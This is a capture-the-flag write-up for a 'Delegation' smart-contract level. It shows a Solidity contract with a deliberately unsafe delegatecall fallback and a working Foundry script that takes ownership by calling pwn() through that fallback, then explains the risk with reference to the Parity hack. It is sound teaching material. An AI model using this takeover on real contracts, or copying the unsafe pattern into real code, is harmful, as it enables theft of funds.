---
title: Delegation
---

Difficulty: ⭐⭐
Date: 1 février 2024
État: Terminé

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

- Look into Solidity's documentation on the `delegatecall`
  low level function, how it works, how it can be used to delegate
  operations to on-chain libraries, and what implications it has on
  execution scope.
- Fallback methods
- Method ids

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

Solution:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface Delegation {
  function owner() external returns(address);
  fallback() external;
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_06");

        vm.startBroadcast(deployerPrivateKey);

        Delegation delegation = Delegation(addr);

        console.logAddress(delegation.owner());

        bytes memory data = abi.encodeWithSignature("pwn()");
        (bool result, ) = address(delegation).call(data);
        if (result) {
        }

        console.logAddress(delegation.owner());

        vm.stopBroadcast();
    }
}
```

Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here,
-other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) article for an accurate explanation of how this idea was used to steal 30M USD.
